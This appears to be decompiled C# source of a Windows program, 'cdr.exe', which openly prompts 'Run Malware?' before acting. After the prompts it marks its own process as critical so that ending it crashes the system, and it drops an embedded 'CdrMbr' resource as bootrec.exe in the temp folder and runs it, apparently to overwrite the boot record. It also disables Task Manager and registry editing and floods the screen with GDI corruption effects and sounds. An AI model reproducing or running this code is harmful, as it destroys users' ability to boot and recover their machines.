// cdr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// cdr.Program
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using cdr;
using cdr.Properties;
using Microsoft.Win32;

internal static class Program
{
	public struct BITMAPINFOHEADER
	{
		public uint biSize;

		public int biWidth;

		public int biHeight;

		public ushort biPlanes;

		public ushort biBitCount;

		public uint biCompression;

		public uint biSizeImage;

		public int biXPelsPerMeter;

		public int biYPelsPerMeter;

		public uint biClrUsed;

		public uint biClrImportant;
	}

	public struct BITMAPINFO
	{
		public BITMAPINFOHEADER bmiHeader;

		public int bmiColors;
	}

	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public abstract class Drawer
	{
		public bool running;

		public Random random = new Random();

		public int screenW = Screen.PrimaryScreen.Bounds.Width;

		public int screenH = Screen.PrimaryScreen.Bounds.Height;

		public void Start()
		{
			if (!running)
			{
				running = true;
				new Thread(DrawLoop).Start();
			}
		}

		public void Stop()
		{
			running = false;
		}

		private void DrawLoop()
		{
			while (running)
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				if (dC != IntPtr.Zero)
				{
					Draw(dC);
					ReleaseDC(IntPtr.Zero, dC);
				}
				Thread.Sleep(10);
			}
		}

		public abstract void Draw(IntPtr hdc);
	}

	private class Drawer1 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				redrawCounter += 5;
				if (redrawCounter >= 360)
				{
					redrawCounter = 0;
				}
				byte b = 0;
				byte b2 = 0;
				byte b3 = 0;
				float num = (float)redrawCounter / 360f;
				float num2 = 1f;
				float num3 = 1f - num2;
				float num4 = num + 1f / 3f;
				if (num4 < 0f)
				{
					num4++;
				}
				if (num4 > 1f)
				{
					num4--;
				}
				b = ((6f * num4 < 1f) ? ((byte)(255f * (num3 + (num2 - num3) * 6f * num4))) : ((2f * num4 < 1f) ? ((byte)(255f * num2)) : ((!(3f * num4 < 2f)) ? ((byte)(255f * num3)) : ((byte)(255f * (num3 + (num2 - num3) * (2f / 3f - num4) * 6f))))));
				float num5 = num;
				if (num5 < 0f)
				{
					num5++;
				}
				if (num5 > 1f)
				{
					num5--;
				}
				b2 = ((6f * num5 < 1f) ? ((byte)(255f * (num3 + (num2 - num3) * 6f * num5))) : ((2f * num5 < 1f) ? ((byte)(255f * num2)) : ((!(3f * num5 < 2f)) ? ((byte)(255f * num3)) : ((byte)(255f * (num3 + (num2 - num3) * (2f / 3f - num5) * 6f))))));
				float num6 = num - 1f / 3f;
				if (num6 < 0f)
				{
					num6++;
				}
				if (num6 > 1f)
				{
					num6--;
				}
				b3 = ((6f * num6 < 1f) ? ((byte)(255f * (num3 + (num2 - num3) * 6f * num6))) : ((2f * num6 < 1f) ? ((byte)(255f * num2)) : ((!(3f * num6 < 2f)) ? ((byte)(255f * num3)) : ((byte)(255f * (num3 + (num2 - num3) * (2f / 3f - num6) * 6f))))));
				using (Graphics graphics = Graphics.FromHdc(hdc))
				{
					using SolidBrush brush = new SolidBrush(Color.FromArgb(128, b, b2, b3));
					graphics.FillRectangle(brush, 0, 0, screenW, screenH);
				}
				int num7 = random.Next(100, 500);
				int num8 = random.Next(100, 500);
				int nXOriginSrc = random.Next(0, screenW - num7);
				int nYOriginSrc = random.Next(0, screenH - num8);
				int nXOriginDest = random.Next(0, screenW - num7);
				int nYOriginDest = random.Next(0, screenH - num8);
				StretchBlt(hdc, nXOriginDest, nYOriginDest, num7, num8, hdc, nXOriginSrc, nYOriginSrc, num7, num8, 6684742u);
			}
			catch
			{
			}
			Thread.Sleep(10);
		}
	}

	public class Drawer2 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				redrawCounter++;
				using (Graphics graphics = Graphics.FromHdc(hdc))
				{
					float num = (float)(redrawCounter % 360) / 360f;
					float num2 = 1f;
					float num3 = 1f - num2;
					float num4 = num + 1f / 3f;
					float num5 = num;
					float num6 = num - 1f / 3f;
					if (num4 < 0f)
					{
						num4++;
					}
					if (num4 > 1f)
					{
						num4--;
					}
					if (num5 < 0f)
					{
						num5++;
					}
					if (num5 > 1f)
					{
						num5--;
					}
					if (num6 < 0f)
					{
						num6++;
					}
					if (num6 > 1f)
					{
						num6--;
					}
					byte red = ((6f * num4 < 1f) ? ((byte)((num3 + (num2 - num3) * 6f * num4) * 255f)) : ((2f * num4 < 1f) ? ((byte)(num2 * 255f)) : ((!(3f * num4 < 2f)) ? ((byte)(num3 * 255f)) : ((byte)((num3 + (num2 - num3) * (2f / 3f - num4) * 6f) * 255f)))));
					byte green = ((6f * num5 < 1f) ? ((byte)((num3 + (num2 - num3) * 6f * num5) * 255f)) : ((2f * num5 < 1f) ? ((byte)(num2 * 255f)) : ((!(3f * num5 < 2f)) ? ((byte)(num3 * 255f)) : ((byte)((num3 + (num2 - num3) * (2f / 3f - num5) * 6f) * 255f)))));
					byte blue = ((6f * num6 < 1f) ? ((byte)((num3 + (num2 - num3) * 6f * num6) * 255f)) : ((2f * num6 < 1f) ? ((byte)(num2 * 255f)) : ((!(3f * num6 < 2f)) ? ((byte)(num3 * 255f)) : ((byte)((num3 + (num2 - num3) * (2f / 3f - num6) * 6f) * 255f)))));
					using SolidBrush brush = new SolidBrush(Color.FromArgb(random.Next(1, 255), red, green, blue));
					Point point = new Point(random.Next(0, screenW), random.Next(0, screenH));
					Point point2 = new Point(random.Next(0, screenW), random.Next(0, screenH));
					Point point3 = new Point(random.Next(0, screenW), random.Next(0, screenH));
					graphics.FillPolygon(brush, new Point[3] { point, point2, point3 });
				}
				if (redrawCounter >= 360)
				{
					redrawCounter = 0;
				}
			}
			catch
			{
			}
		}
	}

	public class Drawer3 : Drawer
	{
		private int colorTimer;

		private float movementAngle;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				colorTimer += 2;
				movementAngle += 0.05f;
				if (colorTimer >= 360)
				{
					colorTimer = 0;
				}
				int nXOriginSrc = (int)(Math.Sin(movementAngle) * 10.0);
				StretchBlt(hdc, 0, 5, screenW, screenH, hdc, nXOriginSrc, 0, screenW, screenH, 13369376u);
				using Graphics graphics = Graphics.FromHdc(hdc);
				float num = (float)(colorTimer % 360) / 360f;
				float num2 = 1f;
				float num3 = 1f - num2;
				float num4 = num + 1f / 3f;
				float num5 = num;
				float num6 = num - 1f / 3f;
				if (num4 < 0f)
				{
					num4++;
				}
				if (num4 > 1f)
				{
					num4--;
				}
				if (num5 < 0f)
				{
					num5++;
				}
				if (num5 > 1f)
				{
					num5--;
				}
				if (num6 < 0f)
				{
					num6++;
				}
				if (num6 > 1f)
				{
					num6--;
				}
				byte red = ((6f * num4 < 1f) ? ((byte)((num3 + (num2 - num3) * 6f * num4) * 255f)) : ((2f * num4 < 1f) ? ((byte)(num2 * 255f)) : ((!(3f * num4 < 2f)) ? ((byte)(num3 * 255f)) : ((byte)((num3 + (num2 - num3) * (2f / 3f - num4) * 6f) * 255f)))));
				byte green = ((6f * num5 < 1f) ? ((byte)((num3 + (num2 - num3) * 6f * num5) * 255f)) : ((2f * num5 < 1f) ? ((byte)(num2 * 255f)) : ((!(3f * num5 < 2f)) ? ((byte)(num3 * 255f)) : ((byte)((num3 + (num2 - num3) * (2f / 3f - num5) * 6f) * 255f)))));
				byte blue = ((6f * num6 < 1f) ? ((byte)((num3 + (num2 - num3) * 6f * num6) * 255f)) : ((2f * num6 < 1f) ? ((byte)(num2 * 255f)) : ((!(3f * num6 < 2f)) ? ((byte)(num3 * 255f)) : ((byte)((num3 + (num2 - num3) * (2f / 3f - num6) * 6f) * 255f)))));
				Color color = Color.FromArgb(red, green, blue);
				int num7 = (int)((double)(screenW / 2) + Math.Cos((double)movementAngle * 1.5) * (double)(screenW / 4));
				int num8 = (int)((double)(screenH / 2) + Math.Sin((double)movementAngle * 2.0) * (double)(screenH / 4));
				int num9 = 80;
				using (SolidBrush brush = new SolidBrush(Color.FromArgb(50, color)))
				{
					graphics.FillEllipse(brush, num7 - num9, num8 - num9, num9 * 2, num9 * 2);
				}
				using Pen pen = new Pen(color, 1f);
				graphics.DrawEllipse(pen, num7 - num9, num8 - num9, num9 * 2, num9 * 2);
			}
			catch
			{
			}
		}
	}

	public class Drawer4 : Drawer
	{
		private int redrawCounter;

		private float rotationAngle;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int num = screenW;
				int num2 = redrawCounter;
				for (int i = 0; i < num; i += 200)
				{
					StretchBlt(hdc, i, num2, 200, 200, hdc, i - 5, num2 - 5, 210, 210, 13369376u);
				}
				redrawCounter += 200;
				if (redrawCounter >= screenH)
				{
					redrawCounter = 0;
				}
				rotationAngle += 0.08f;
				int num3 = random.Next(60, 250);
				int num4 = screenW / 2;
				int num5 = screenH / 2;
				int num6 = random.Next(100, Math.Min(screenW, screenH) / 3);
				int num7 = (int)((double)num4 + Math.Cos(rotationAngle) * (double)num6) - num3 / 2;
				int num8 = (int)((double)num5 + Math.Sin(rotationAngle) * (double)num6) - num3 / 2;
				if (num7 < 0)
				{
					num7 = 0;
				}
				if (num8 < 0)
				{
					num8 = 0;
				}
				if (num7 + num3 > screenW)
				{
					num7 = screenW - num3;
				}
				if (num8 + num3 > screenH)
				{
					num8 = screenH - num3;
				}
				PatBlt(hdc, num7, num8, num3, num3, 5898313u);
			}
			catch
			{
			}
		}
	}

	public class Drawer5 : Drawer
	{
		private float jellyTime;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				jellyTime += 0.1f;
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				StretchBlt(intPtr, 0, 0, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 13369376u);
				StretchBlt(intPtr, screenW / 2, 0, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 13369376u);
				StretchBlt(intPtr, 0, screenH / 2, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 13369376u);
				StretchBlt(intPtr, screenW / 2, screenH / 2, screenW / 2, screenH / 2, hdc, 0, 0, screenW, screenH, 13369376u);
				int num = random.Next(40, 200);
				int nXLeft = random.Next(0, screenW - num);
				int nYLeft = random.Next(0, screenH - num);
				PatBlt(intPtr, nXLeft, nYLeft, num, num, 5898313u);
				for (int i = 0; i < screenW; i += 2)
				{
					int nYOriginDest = (int)(Math.Sin(jellyTime + (float)i * 0.01f) * 15.0);
					StretchBlt(hdc, i, nYOriginDest, 2, screenH, intPtr, i, 0, 2, screenH, 13369376u);
				}
				for (int j = 0; j < screenH; j += 2)
				{
					int nXOriginDest = (int)(Math.Cos(jellyTime + (float)j * 0.01f) * 15.0);
					StretchBlt(hdc, nXOriginDest, j, screenW, 2, hdc, 0, j, screenW, 2, 13369376u);
				}
				DeleteObject(intPtr2);
				DeleteDC(intPtr);
			}
			catch
			{
			}
		}
	}

	public class Drawer6 : Drawer
	{
		private int redrawCounter;

		private float rotationAngle;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				int num = screenW;
				int num2 = redrawCounter;
				for (int i = 0; i < num; i += 200)
				{
					StretchBlt(hdc, i, num2, 200, 200, hdc, i - 5, num2 - 5, 210, 210, 13369376u);
				}
				redrawCounter += 200;
				if (redrawCounter >= screenH)
				{
					redrawCounter = 0;
				}
				rotationAngle += 0.08f;
				int num3 = random.Next(60, 250);
				int num4 = screenW / 2;
				int num5 = screenH / 2;
				int num6 = random.Next(100, Math.Min(screenW, screenH) / 3);
				int num7 = (int)((double)num4 + Math.Cos(rotationAngle) * (double)num6) - num3 / 2;
				int num8 = (int)((double)num5 + Math.Sin(rotationAngle) * (double)num6) - num3 / 2;
				if (num7 < 0)
				{
					num7 = 0;
				}
				if (num8 < 0)
				{
					num8 = 0;
				}
				if (num7 + num3 > screenW)
				{
					num7 = screenW - num3;
				}
				if (num8 + num3 > screenH)
				{
					num8 = screenH - num3;
				}
				PatBlt(hdc, num7, num8, num3, num3, 5898313u);
				Process[] processes = Process.GetProcesses();
				for (int j = 0; j < processes.Length; j++)
				{
					if (!(processes[j].MainWindowHandle != IntPtr.Zero))
					{
						continue;
					}
					if (GetWindowRect(GetForegroundWindow(), out var lpRect))
					{
						int num9 = lpRect.Right - lpRect.Left;
						int num10 = lpRect.Bottom - lpRect.Top;
						if (num9 > 0 && num10 > 0)
						{
							int nXOriginDest = random.Next(-screenW, screenW * 2);
							int nYOriginDest = random.Next(-screenH, screenH * 2);
							IntPtr intPtr = CreateSolidBrush((uint)random.Next(0, 16777216));
							IntPtr hgdiobj = SelectObject(hdc, intPtr);
							PatBlt(hdc, lpRect.Left, lpRect.Top, num9, num10, 5898313u);
							SelectObject(hdc, hgdiobj);
							DeleteObject(intPtr);
							StretchBlt(hdc, nXOriginDest, nYOriginDest, num9 - 10, num10 - 10, hdc, lpRect.Left, lpRect.Top, num9, num10, 6684742u);
						}
					}
					Thread.Sleep(10);
				}
			}
			catch
			{
			}
		}

		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);
	}

	public class Drawer7 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			float num = 0f;
			float num2 = 0f;
			float num3 = 20f;
			for (float num4 = 0f; num4 < 10f; num4 += 0.1f)
			{
				float num5 = (float)Math.Sin(num4);
				redrawCounter += 10;
				int num6 = redrawCounter;
				int nXOriginDest = (int)(num * num3 + num2);
				StretchBlt(hdc, nXOriginDest, num6, screenW, 10, hdc, 0, num6, screenW, 10, 13369376u);
				if (redrawCounter >= screenH)
				{
					redrawCounter = 0;
					RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
				}
				num = num5;
			}
			Thread.Sleep(10);
		}
	}

	public class Drawer8 : Drawer
	{
		private int redrawCounter1;

		private int redrawCounter2;

		public override void Draw(IntPtr hdc)
		{
			int num = screenW;
			int num2 = redrawCounter1;
			for (int i = 0; i < num; i += 200)
			{
				StretchBlt(hdc, i, num2, 200, 200, hdc, i - 5, num2 - 5, 210, 210, 13369376u);
			}
			redrawCounter1 += 200;
			if (redrawCounter1 >= screenH)
			{
				redrawCounter1 = 0;
			}
			float num3 = 0f;
			float num4 = 0f;
			float num5 = 20f;
			for (float num6 = 0f; num6 < 10f; num6 += 0.1f)
			{
				float num7 = (float)Math.Sin(num6);
				redrawCounter2 += 10;
				int num8 = redrawCounter2;
				int nXOriginDest = (int)(num3 * num5 + num4);
				StretchBlt(hdc, nXOriginDest, num8, screenW, 10, hdc, 0, num8, screenW, 10, 13369376u);
				if (redrawCounter2 >= screenH)
				{
					redrawCounter2 = 0;
					RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
				}
				num3 = num7;
			}
			Thread.Sleep(10);
		}
	}

	public class Drawer9 : Drawer
	{
		private float circleAngle;

		private IntPtr hdcMem;

		private IntPtr hBmp;

		private IntPtr bitsPtr;

		private int byteSize;

		public Drawer9()
		{
			byteSize = screenW * screenH * 4;
			IntPtr dC = GetDC(IntPtr.Zero);
			hdcMem = CreateCompatibleDC(dC);
			BITMAPINFO pbmi = new BITMAPINFO
			{
				bmiHeader = 
				{
					biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
					biWidth = screenW,
					biHeight = screenH,
					biPlanes = 1,
					biBitCount = 32,
					biCompression = 0u
				}
			};
			hBmp = CreateDIBSection(dC, ref pbmi, 0u, out bitsPtr, IntPtr.Zero, 0u);
			SelectObject(hdcMem, hBmp);
			ReleaseDC(IntPtr.Zero, dC);
		}

		public override void Draw(IntPtr hdc)
		{
			try
			{
				BitBlt(hdcMem, 0, 0, screenW, screenH, hdc, 0, 0, 13369376u);
				byte[] array = new byte[byteSize];
				Marshal.Copy(bitsPtr, array, 0, byteSize);
				for (int i = 0; i < screenW * screenH; i++)
				{
					int num = i * 4;
					byte num2 = array[num];
					byte num3 = array[num + 1];
					int num4 = array[num + 2] * 2 % 256;
					int num5 = num3 * 2 % 256;
					int num6 = num2 * 2 % 256;
					array[num] = (byte)num6;
					array[num + 1] = (byte)num5;
					array[num + 2] = (byte)num4;
				}
				Marshal.Copy(array, 0, bitsPtr, byteSize);
				BitBlt(hdc, 0, 0, screenW, screenH, hdcMem, 0, 0, 13369376u);
				circleAngle += 0.05f;
				using Graphics graphics = Graphics.FromHdc(hdc);
				int red = random.Next(0, 256);
				int green = random.Next(0, 256);
				int blue = random.Next(0, 256);
				Color color = Color.FromArgb(red, green, blue);
				int num7 = (int)((double)(screenW / 2) + Math.Cos((double)circleAngle * 1.5) * (double)(screenW / 4));
				int num8 = (int)((double)(screenH / 2) + Math.Sin((double)circleAngle * 2.0) * (double)(screenH / 4));
				int num9 = 80;
				using (SolidBrush brush = new SolidBrush(Color.FromArgb(50, color)))
				{
					graphics.FillEllipse(brush, num7 - num9, num8 - num9, num9 * 2, num9 * 2);
				}
				using Pen pen = new Pen(color, 1f);
				graphics.DrawEllipse(pen, num7 - num9, num8 - num9, num9 * 2, num9 * 2);
			}
			catch
			{
			}
		}
	}

	public class Drawer10 : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				int nXOriginSrc = random.Next(0, screenW - 100);
				int nYOriginSrc = random.Next(0, screenH - 100);
				int num = random.Next(100, 400);
				int num2 = random.Next(100, 400);
				int nXOriginDest = random.Next(0, screenW - 100);
				int nYOriginDest = random.Next(0, screenH - 100);
				int nWidthDest = random.Next(10, num / 2);
				int nHeightDest = random.Next(10, num2 / 2);
				StretchBlt(hdc, nXOriginDest, nYOriginDest, nWidthDest, nHeightDest, hdc, nXOriginSrc, nYOriginSrc, num, num2, 10027110u);
				Thread.Sleep(300);
			}
			catch
			{
			}
		}
	}

	private class cur : Drawer
	{
		private int redrawCounter;

		private int codcod;

		private int ballWidth = 1;

		private int ballHeight = 1;

		private int ballPosX = Cursor.Position.X;

		private int ballPosY = Cursor.Position.Y;

		private int moveStepX = 1;

		private int moveStepY = 1;

		public override void Draw(IntPtr hdc)
		{
			new Random();
			_ = screenW;
			_ = screenH;
			Cursor.Position = new Point(ballPosX, ballPosY);
			ballPosX += moveStepX;
			if (ballPosX < 0 || ballPosX + ballWidth > screenW)
			{
				moveStepX = -moveStepX;
			}
			ballPosY += moveStepY;
			if (ballPosY < 0 || ballPosY + ballHeight > screenH)
			{
				moveStepY = -moveStepY;
			}
			if (redrawCounter >= 360)
			{
				redrawCounter = 0;
			}
			if (codcod >= 360)
			{
				codcod = 0;
			}
		}
	}

	public static int BreakOnTermination = 29;

	public static int isCritical = 1;

	[DllImport("user32.dll")]
	public static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll")]
	public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

	[DllImport("gdi32.dll")]
	public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleDC(IntPtr hDC);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteObject(IntPtr hObject);

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

	[DllImport("user32.dll")]
	public static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, uint flags);

	[DllImport("gdi32.dll")]
	public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(defaultValue: false);
		Thread thread = new Thread(RunWorkflow);
		thread.IsBackground = true;
		thread.Start();
		Application.Run();
	}

	private static void RunWorkflow()
	{
		if (MessageBox.Show("Run Malware?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes && MessageBox.Show("Are you sure?", "cdr.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			Process.EnterDebugMode();
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, 4);
			string text = Path.Combine(Path.GetTempPath(), "bootrec.exe");
			File.WriteAllBytes(text, Resources.CdrMbr);
			Process.Start(text);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			Drawer1 drawer = new Drawer1();
			Drawer drawer2 = new Drawer2();
			Drawer drawer3 = new Drawer3();
			Drawer drawer4 = new Drawer4();
			Drawer drawer5 = new Drawer5();
			Drawer drawer6 = new Drawer6();
			Drawer drawer7 = new Drawer7();
			Drawer drawer8 = new Drawer8();
			Drawer drawer9 = new Drawer9();
			Drawer drawer10 = new Drawer10();
			Drawer drawer11 = new cur();
			SoundPlayer soundPlayer = new SoundPlayer(Resources.track__1_);
			SoundPlayer soundPlayer2 = new SoundPlayer(Resources.track__2_);
			SoundPlayer soundPlayer3 = new SoundPlayer(Resources.track__3_);
			SoundPlayer soundPlayer4 = new SoundPlayer(Resources.track__4_);
			SoundPlayer soundPlayer5 = new SoundPlayer(Resources.track__5_);
			SoundPlayer soundPlayer6 = new SoundPlayer(Resources.track__6_);
			SoundPlayer soundPlayer7 = new SoundPlayer(Resources.track__7_);
			SoundPlayer soundPlayer8 = new SoundPlayer(Resources.track__8_);
			SoundPlayer soundPlayer9 = new SoundPlayer(Resources.track__9_);
			SoundPlayer soundPlayer10 = new SoundPlayer(Resources.track__10_);
			Thread.Sleep(5000);
			drawer11.Start();
			drawer.Start();
			soundPlayer.Play();
			Thread.Sleep(30000);
			drawer.Stop();
			soundPlayer.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer2.Start();
			soundPlayer2.Play();
			Thread.Sleep(30000);
			drawer2.Stop();
			soundPlayer2.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer3.Start();
			soundPlayer3.Play();
			Thread.Sleep(30000);
			drawer3.Stop();
			soundPlayer3.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer4.Start();
			soundPlayer4.Play();
			Thread.Sleep(30000);
			drawer4.Stop();
			soundPlayer4.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer5.Start();
			soundPlayer5.Play();
			Thread.Sleep(30000);
			drawer5.Stop();
			soundPlayer5.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer6.Start();
			soundPlayer6.Play();
			Thread.Sleep(30000);
			drawer6.Stop();
			soundPlayer6.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer7.Start();
			soundPlayer7.Play();
			Thread.Sleep(30000);
			drawer7.Stop();
			soundPlayer7.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer8.Start();
			soundPlayer8.Play();
			Thread.Sleep(30000);
			drawer8.Stop();
			soundPlayer8.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer9.Start();
			soundPlayer9.Play();
			Thread.Sleep(30000);
			drawer9.Stop();
			soundPlayer9.Stop();
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133u);
			drawer10.Start();
			soundPlayer10.Play();
			Thread.Sleep(30000);
			drawer10.Stop();
			soundPlayer10.Stop();
			drawer11.Stop();
			Environment.Exit(0);
		}
	}
}
